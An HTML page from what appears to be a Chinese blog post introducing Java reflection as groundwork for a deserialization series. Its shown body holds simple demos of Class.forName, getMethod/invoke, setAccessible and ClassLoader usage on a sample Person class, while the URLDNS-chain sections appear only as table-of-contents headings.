<!DOCTYPE html>
<html lang='zh-CN'>

<head>
  <meta name="generator" content="Hexo 6.2.0">
  <meta charset="utf-8">
  

  <meta http-equiv='x-dns-prefetch-control' content='on' />
  <link rel='dns-prefetch' href='https://fastly.jsdelivr.net'>
  <link rel="preconnect" href="https://fastly.jsdelivr.net" crossorigin>
  <link rel='dns-prefetch' href='//unpkg.com'>

  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" content="#f8f8f8">
  <title>Java反序列化1-反射与URLDNS链 - z-bool</title>

  
    <meta name="description" content="1. 反射 通过Demo来学习反射  1.1 创建Person类123456789101112131415161718192021222324252627282930313233343536373839404142public class Person implements Serializable &amp;#123; &#x2F;&#x2F; implements 实现 Serializable序列化接口 说明支持被反序">
<meta property="og:type" content="article">
<meta property="og:title" content="Java反序列化1-反射与URLDNS链">
<meta property="og:url" content="http://example.com/2022/10/16/java-deserializ-1/index.html">
<meta property="og:site_name" content="z-bool">
<meta property="og:description" content="1. 反射 通过Demo来学习反射  1.1 创建Person类123456789101112131415161718192021222324252627282930313233343536373839404142public class Person implements Serializable &amp;#123; &#x2F;&#x2F; implements 实现 Serializable序列化接口 说明支持被反序">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016162721591.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016170243340.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016165151897.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016180514838.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016184240868.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016193325967.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017094702114.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017094913788.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017094937165.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017095204447.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017100153211.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017100222477.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017100511427.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017100813989.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017101008844.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017102423692.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017102731835.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017102908856.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017103024021.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017103126576.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017104119390.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017104251943.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017133854848.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017134321726.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017134539572.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017134720271.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017134834331.png">
<meta property="article:published_time" content="2022-10-16T07:22:43.000Z">
<meta property="article:modified_time" content="2022-10-17T06:15:13.738Z">
<meta property="article:author" content="z-bool">
<meta property="article:tag" content="Java反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016162721591.png">
  
  

  <!-- feed -->
  

  
    
<link rel="stylesheet" href="/css/main.css">

  

  

  

  


  
</head>

<body>
  




  <div class='l_body' id='start'>
    <aside class='l_left' layout='post'>
    


<header class="header">

<div class="logo-wrap"><a class="title" href="/"><div class="main">z-bool</div></a></div>
<nav class="menu dis-select"></nav></header>

<div class="widgets">

<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84"><span class="toc-text">1. 反射</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E5%88%9B%E5%BB%BAPerson%E7%B1%BB"><span class="toc-text">1.1 创建Person类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E7%94%A8Demo%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84"><span class="toc-text">1.2 用Demo理解反射</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-1-%E5%9B%9B%E7%A7%8D%E5%8F%8D%E5%B0%84"><span class="toc-text">1.2.1 四种反射</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-2-Class-forname"><span class="toc-text">1.2.2 Class.forname()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%97%A0%E5%8F%82%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="toc-text">反射无参构造函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%9E%84%E9%80%A0%E8%AE%BE%E7%BD%AE%E5%B1%9E%E6%80%A7%E5%92%8C%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">无参构造设置属性和调用方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%85%A8%E5%8F%82%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="toc-text">反射全参构造函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A8%E5%8F%82%E6%9E%84%E9%80%A0%E8%AE%BE%E7%BD%AE%E5%B1%9E%E6%80%A7%E5%92%8C%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">全参构造设置属性和调用方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-%E7%B1%BB-class"><span class="toc-text">1.2.3 类.class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-4-%E5%AF%B9%E8%B1%A1-getClass"><span class="toc-text">1.2.4 对象.getClass()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-5-%E4%BB%80%E4%B9%88%E6%98%AFClassLoader"><span class="toc-text">1.2.5 什么是ClassLoader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-6-getClassLoader"><span class="toc-text">1.2.6 getClassLoader()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-URLDNS%E9%93%BE"><span class="toc-text">2. URLDNS链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-URLDNS%E9%93%BE"><span class="toc-text">2.1 URLDNS链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">2.2 序列化与反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E7%BB%93%E6%9E%9C"><span class="toc-text">2.5 结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-Gadget%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">2.6 Gadget利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-text">流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HashMap"><span class="toc-text">HashMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL"><span class="toc-text">URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-text">调试流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7-%E9%98%85%E8%AF%BBysoserial%E7%9A%84POC"><span class="toc-text">2.7 阅读ysoserial的POC</span></a></li></ol></li></ol></div></div></div>


</div>


    </aside>
    <div class='l_main'>
      

      


<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div><div id="post-meta">发布于&nbsp;<time datetime="2022-10-16T07:22:43.000Z">2022-10-16</time></div></div>

<article class='content md post'>
<h1 class="article-title"><span>Java反序列化1-反射与URLDNS链</span></h1>
<h2 id="1-反射"><a href="#1-反射" class="headerlink" title="1. 反射"></a>1. 反射</h2><blockquote>
<p>通过Demo来学习反射</p>
</blockquote>
<h3 id="1-1-创建Person类"><a href="#1-1-创建Person类" class="headerlink" title="1.1 创建Person类"></a>1.1 创建Person类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123; <span class="comment">// implements 实现 Serializable序列化接口 说明支持被反序列化</span></span><br><span class="line">    <span class="comment">// private 是一个Java的规范，定义属性时，不能直接控制这个类的属性，要通过Getter/Setter对数据进行获取和设置</span></span><br><span class="line">    <span class="keyword">private</span> Integer id; <span class="comment">// 设置一个int类型的字段id</span></span><br><span class="line">    <span class="keyword">private</span> String name; <span class="comment">// 设置一个string类型的name字段</span></span><br><span class="line">    <span class="comment">// 全参构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(Integer id, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 无参构造函数(默认)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// Getter/Setter方法，用于对私有的属性设置和获取值，public可以提供其他地方调用</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义的一个方法，用来被调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">canDo</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;人能与运动&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 用于调试输出，对Object的toString方法重写</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-用Demo理解反射"><a href="#1-2-用Demo理解反射" class="headerlink" title="1.2 用Demo理解反射"></a>1.2 用Demo理解反射</h3><h4 id="1-2-1-四种反射"><a href="#1-2-1-四种反射" class="headerlink" title="1.2.1 四种反射"></a>1.2.1 四种反射</h4><blockquote>
<p>这里会用到四种反射Demo为了各种应用场景，这四种反射都需要有涉猎</p>
</blockquote>
<ol>
<li><code>Class.forname(&quot;包名&quot;)</code> 使用Class类中的forName()静态方法（最安全，性能最好）</li>
<li><code>类名.class</code> 调用类的class属性类获取该类对应的Class对象</li>
<li><code>对象.getClass()</code> 调用某个类的对象的getClass()方法</li>
<li><code>对象.getClass().getClassLoader().loadClass(&quot;包名&quot;)</code> 通过类加载器动态加载</li>
</ol>
<h4 id="1-2-2-Class-forname"><a href="#1-2-2-Class-forname" class="headerlink" title="1.2.2 Class.forname()"></a>1.2.2 Class.forname()</h4><h5 id="反射无参构造函数"><a href="#反射无参构造函数" class="headerlink" title="反射无参构造函数"></a>反射无参构造函数</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.获取Person的Class对象</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.reflection.entity.Person&quot;</span>);</span><br><span class="line"><span class="comment">// 2. 调用Person的无参构造函数</span></span><br><span class="line">Constructor&lt;?&gt; constructor1 = clazz.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> constructor1.newInstance();</span><br><span class="line">System.out.println(<span class="string">&quot;o1地址：&quot;</span> + o1);</span><br><span class="line">System.out.println(<span class="string">&quot;o1是否为Person对象：&quot;</span> + (o1 <span class="keyword">instanceof</span> Person));</span><br><span class="line"><span class="comment">// 或者直接用默认的实例化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o2</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line">System.out.println(<span class="string">&quot;o2地址：&quot;</span> + o2);</span><br><span class="line">System.out.println(<span class="string">&quot;o2是否为Person对象：&quot;</span> + (o1 <span class="keyword">instanceof</span> Person));</span><br><span class="line">System.out.println(<span class="string">&quot;o1与o2是否相同&quot;</span> + o1 == o2);</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016162721591.png" alt="image-20221016162721591"></p>
<p>分析一下这段代码：</p>
<ol>
<li>先通过Class.forname()获取Person的Class对象</li>
<li>再获取Class对象中的无参构造器去实例化<code>newInstance()</code>一个对象，返回值是一个对象</li>
<li>查看对象是否是Person类，并确定地址</li>
<li>用instanceof判断是否是Person的对象</li>
<li>最后判断两个对象是否一样，因为这里的地址是不一样的<code>@4d7e1886</code>所以我们可以知道这是两个对象</li>
</ol>
<h5 id="无参构造设置属性和调用方法"><a href="#无参构造设置属性和调用方法" class="headerlink" title="无参构造设置属性和调用方法"></a>无参构造设置属性和调用方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.reflection.entity.Person&quot;</span>);</span><br><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) clazz.newInstance();</span><br><span class="line"><span class="type">Object</span> <span class="variable">person1</span> <span class="operator">=</span>  clazz.newInstance();</span><br><span class="line"><span class="comment">// 正向设置值获取值</span></span><br><span class="line">person.setId(<span class="number">1</span>);</span><br><span class="line">person.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">person.canDo();</span><br><span class="line">System.out.println(person);</span><br><span class="line"><span class="comment">// 通过反射设置值并获取方法</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;setId&quot;</span>, Integer.class).invoke(person1, <span class="number">2</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class).invoke(person1, <span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;canDo&quot;</span>).invoke(person1);</span><br><span class="line">Field[] declaredFields = clazz.getDeclaredFields();</span><br><span class="line"><span class="comment">// 遍历属性名</span></span><br><span class="line"><span class="keyword">for</span> (Field declaredField : declaredFields)&#123;</span><br><span class="line">    System.out.println(declaredField.getType() + <span class="string">&quot; &quot;</span> + declaredField.getName());</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(person1);</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016170243340.png" alt="image-20221016170243340"></p>
<p>分析一下这段代码：</p>
<ol>
<li><p>先通过无参构造函数获取对象，由于这里区分正反向，我们在正向操作时进行强转才可以调用方法，在反射中我们默认是不知道这个对象的，我们可以通过反射获取Object即可</p>
</li>
<li><p>反射式通过Class对象静态加载后通过getMethod方法</p>
<ol>
<li><p>第一个参数是<code>方法名</code> </p>
</li>
<li><p>第二个参数是<code>参数类型</code> ，在源码中是可变参数，无参就不填，有参就填参数类型</p>
</li>
<li><p>读一下这个方法的源码：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016165151897.png" alt="image-20221016165151897"></p>
</li>
</ol>
</li>
<li><p>调用反射获取的方法，<code>invoke</code> 可以理解为是<u>Method对象的调用方法</u></p>
</li>
<li><p>通过反射获取字段属性通过<code>getField()</code>和<code>getDeclaredField()</code> 获取，区别是<code>getDeclaredField</code> 可以获取<u>private</u>修饰的属性</p>
</li>
</ol>
<h5 id="反射全参构造函数"><a href="#反射全参构造函数" class="headerlink" title="反射全参构造函数"></a>反射全参构造函数</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.reflection.entity.Person&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> clazz.getConstructor(Integer.class, String.class).newInstance(<span class="number">1</span>, <span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">System.out.println(o <span class="keyword">instanceof</span> Person);</span><br><span class="line">System.out.println(o);</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016180514838.png" alt="image-20221016180514838"></p>
<p>分析一下这段代码：</p>
<ol>
<li>我们Person对象全参构造器有两个参数，将两个参数的class作为参数传入<code>getConstructor()</code>方法中再传入两个实参进行实例化</li>
<li>查看反射出来的结果是否是Person对象</li>
<li>将结果打印查看一下</li>
</ol>
<h5 id="全参构造设置属性和调用方法"><a href="#全参构造设置属性和调用方法" class="headerlink" title="全参构造设置属性和调用方法"></a>全参构造设置属性和调用方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.reflection.entity.Person&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> clazz.getConstructor(Integer.class, String.class).newInstance(<span class="number">1</span>, <span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">id</span> <span class="operator">=</span> (Integer) clazz.getMethod(<span class="string">&quot;getId&quot;</span>).invoke(o);</span><br><span class="line">System.out.println(<span class="string">&quot;id：&quot;</span> + id);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;canDo&quot;</span>).invoke(o);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;setId&quot;</span>, Integer.class).invoke(o, <span class="number">2</span>);</span><br><span class="line">System.out.println(o);</span><br><span class="line"><span class="comment">// 或者直接为私有属性设置固定值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">id1</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="comment">//  Integer integer = (Integer) id1.get(o); // 这个是执行不了的，没有私有属性设置Accessible为true</span></span><br><span class="line"><span class="comment">//  System.out.println(integer);</span></span><br><span class="line">id1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;之前的id：&quot;</span> + id1.get(o));</span><br><span class="line">id1.set(o, <span class="number">3</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;getId&quot;</span>).invoke(o);</span><br><span class="line">System.out.println(o);</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016184240868.png" alt="image-20221016184240868"></p>
<p>分析一下这段代码：</p>
<ol>
<li>我们在获取全参构造函数实例的一个对象之后，先通过他的<code>getId()</code>方法获取一下id，看看是否获取成功</li>
<li>然后调用<code>canDo()</code>是否正常执行</li>
<li>再通过<code>setId()</code>方法给id设置一个新值，最后打印查看已经完全替换</li>
<li>通过field获取id的值，在private修饰的私有属性时，就需要设置Accessible为true，否则不允许读写</li>
<li>然后我们看到通过修改，id变为3</li>
</ol>
<h4 id="1-2-3-类-class"><a href="#1-2-3-类-class" class="headerlink" title="1.2.3 类.class"></a>1.2.3 类.class</h4><blockquote>
<p>所有方法基本与<code>Class.forname()</code>相同，只有在获取Class对象的途径上有所区别</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.获取Person的Class对象</span></span><br><span class="line"><span class="comment">//  Class&lt;?&gt; clazz = Class.forName(&quot;com.example.reflection.entity.Person&quot;);</span></span><br><span class="line">Class&lt;Person&gt; clazz = Person.class; <span class="comment">// 差别只在这里</span></span><br></pre></td></tr></table></figure>

<p>相关内容与Class.forname()相同</p>
<h4 id="1-2-4-对象-getClass"><a href="#1-2-4-对象-getClass" class="headerlink" title="1.2.4 对象.getClass()"></a>1.2.4 对象.getClass()</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.获取Person的Class对象</span></span><br><span class="line"><span class="comment">// Class&lt;?&gt; clazz = Class.forName(&quot;com.example.reflection.entity.Person&quot;);</span></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">Person</span>&gt; clazz = <span class="keyword">new</span> <span class="title class_">Person</span>().getClass();</span><br></pre></td></tr></table></figure>

<p>相关内容与Class.forname()相同</p>
<h4 id="1-2-5-什么是ClassLoader"><a href="#1-2-5-什么是ClassLoader" class="headerlink" title="1.2.5 什么是ClassLoader"></a>1.2.5 什么是ClassLoader</h4><p>我们可以简单理解为<u>Class的加载器</u>(找<code>.class</code> 的文件然后将他解析执行)，所有加载的本质都是通过ClassLoader去执行。</p>
<h4 id="1-2-6-getClassLoader"><a href="#1-2-6-getClassLoader" class="headerlink" title="1.2.6 getClassLoader()"></a>1.2.6 getClassLoader()</h4><blockquote>
<p>这里通过getClassLoader()获取Class对象，这里有多种方式，主要从上几种衍生而来。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 1.方式1：通过类.class找他的ClassLoader去加载Class   </span></span><br><span class="line">Class&lt;?&gt; clazz1 = ReflectionTest4.class.getClassLoader().loadClass(<span class="string">&quot;com.example.reflection.entity.Person&quot;</span>);</span><br><span class="line"><span class="comment">// 2. 方式2： 通过对象.getClass找他的ClassLoader去加载Class</span></span><br><span class="line">Class&lt;?&gt; clazz2 = <span class="keyword">new</span> <span class="title class_">ReflectionTest4</span>().getClass().getClassLoader().loadClass(<span class="string">&quot;com.example.reflection.entity.Person&quot;</span>);</span><br><span class="line"><span class="comment">// 3. 方式3：通过Class.forname()找他的ClassLoader去加载Class(没必要)</span></span><br><span class="line">Class&lt;?&gt; clazz3 = Class.forName(<span class="string">&quot;com.example.reflection.main.ReflectionTest4&quot;</span>).getClassLoader().loadClass(<span class="string">&quot;com.example.reflection.entity.Person&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>就是对上三种的加载基础上转变一下使用ClassLoader来加载。</p>
